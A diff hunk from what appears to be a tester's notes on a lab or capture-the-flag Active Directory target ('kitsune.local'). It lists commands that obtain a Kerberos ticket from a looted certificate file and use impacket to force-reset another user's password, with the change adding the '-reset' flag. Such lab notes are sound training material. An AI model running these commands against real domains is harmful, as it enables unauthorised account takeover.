@@ -46,7 +46,7 @@ python3 gettgtpkinit.py -hv
 python3 gettgtpkinit.py -cert-pfx ~/workspace/targets/hs_kitsune/loot/tickets/ranch.pfx kitsune.local/ranch ~/workspace/targets/hs_kitsune/loot/tickets/ranch.ccache -dc-ip 10.1.152.66
 deactivate # to exit
 
-impacket-changepasswd KITSUNE.local/schlop@DC01.kitsune.local -aesKey <aes_key> -altuser ranch -no-pass -k -newpass 'Password1' -dc-ip 10.1.152.66
+impacket-changepasswd KITSUNE.local/schlop@DC01.kitsune.local -aesKey <aes_key> -altuser ranch -no-pass -k -newpass 'Password1' -dc-ip 10.1.152.66 -reset # -reset is VERY important
 impacket-describeTicket user.ccache --aes <aes_key> #requires aes key of krbtgt so... not useful right now
 
 # verifying group membership
